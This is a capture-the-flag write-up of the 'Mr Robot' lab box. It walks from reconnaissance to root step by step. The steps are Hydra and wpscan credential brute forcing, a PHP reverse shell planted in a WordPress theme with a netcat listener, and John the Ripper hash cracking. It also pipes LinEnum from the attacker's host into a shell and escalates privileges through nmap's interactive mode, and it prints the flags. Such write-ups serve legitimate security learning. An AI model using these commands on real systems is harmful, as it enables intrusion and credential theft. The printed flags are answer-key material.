# Module: Mr Robot CTF

Author: Jackson Warren  
Date: August 30, 2022

## Export IP
$ `export ip=10.10.27.8`

## Nmap scan
$ `nmap -sC -sV -oN nmap-$ip.out $ip`

## Hint #1
"robots"

Check /robots.txt URL

Found:
- User-agent: *
- fsocity.dic
- key-1-of-3.txt

$ `cat key-1-of-3.txt`
**073403c8a58a1f80d943455fb30724b9**

## GoBuster scan
Found **wp-login** on gobuster

## Burp Suite Intercept
Used burp suite to capture request
![Burp Suite](/images/Screenshot_20220830_035142.png)
**log=admin&pwd=admin**&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.27.8%2Fwp-admin%2F&testcookie=1

## Use Hydra To Crack Username And Password

#### Using hydra to find username:
$ `hydra -L fsocity.dic -p test 10.10.27.8 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"`

Username = **Elliot**

## Sort out dupes from fsocity.dic
$ `wc -l fsocity.dic`       
858160 fsocity.dic  
$ `sort fsocity.dic | uniq > fsocity_sorted.dic`  
$ `wc -l fsocity_sorted.dic`  
11451 fsocity_sorted.dic -- MUCH smaller :)

## Use wpscan to find password:
$ `wpscan -U user.txt -P fsocity_sorted.dic --url http://10.10.27.8/wp-login.php`

`[!] Valid Combinations Found:  
 | Username: Elliot, Password: ER28-0652`

Password = ER28-0652

## Login to WordPress
Username = **Elliot**  
Password = **ER28-0652**

## Insert PHP resverse shell
[https://github.com/pentestmonkey/php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

Edit theme template archive page and paste in reverse shell then change IP to your tun0 IP and the port to your nc listener port which is 53


## Run Netcat Listener
$ `rlwrap nc -lvnp 53` # rlwrap is quality of life add on for tab completions etc

## Enumerate
`ls /home`
robot
cd /home/robot
ls
key-2-of-3.txt
password.raw-md5

ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
`cat password.raw-md5`
robot:c3fcd3d76192e4007dfb496cca67e13b

## Create m5d.hash file
`gedit md5.hash`
paste hash (c3fcd3d76192e4007dfb496cca67e13b) and save

## Run John The Ripper To Crack MD5 Hash
$ `john md5.hash --wordlist=fsocity.dic --format=Raw-MD5`

password = **abcdefghijklmnopqrstuvwxyz**

## Upgrade to interactive shell
$ `python -c 'import pty;pty.spawn("/bin/bash")'`

## Switch user to robot
$ `su robot`
enter password: **abcdefghijklmnopqrstuvwxyz**

## Cat flag #2 :)
`cat key-2-of-3.txt`
**822c73956184f694993bede3eb39f959**

## Privlage Escalation
using LinEnum 
clone LinEnum and cd into LinEnum
run a simple server
$ `python3 -m http.server 80`

On victim box run curl
`curl <your tun0 IP>/LinEnum.sh | sh

---- INTERESTING FILES -----
Notice nmap is installed on the server?  

run nmap and find its a version capable of running in interactive mode

### run nmap in interactive mode
`nmap --interactive`

run `!sh`
you are now root

`cd /root`
`ls`
`cat key-3-of-3.txt`
**04787ddef27c3dee1ee161b21670b4e4**



